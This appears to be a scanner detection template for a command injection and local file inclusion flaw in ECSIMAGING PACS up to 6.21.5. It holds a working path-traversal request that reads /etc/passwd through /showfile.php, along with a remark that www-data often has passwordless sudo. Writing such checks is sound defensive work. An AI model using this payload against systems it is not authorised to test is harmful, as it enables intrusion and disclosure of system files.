id: ecsimagingpacs-rce
name: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion
severity: critical
confidence: tentative
description: ECSIMAGING PACS Application 6.21.5 and below suffer from a command injection vulnerability and a local file include
  vulnerability. The 'file' parameter on the page /showfile.php can be exploited to perform command execution or local file
  inclusion. Often on ECSIMAGING PACS, the www-data user has sudo NOPASSWD access.
reference: CWE-78
tags:
- ecsimagingpacs
- rce
- vuln
requests:
- method: GET
  path: /showfile.php?file=/etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  condition: and
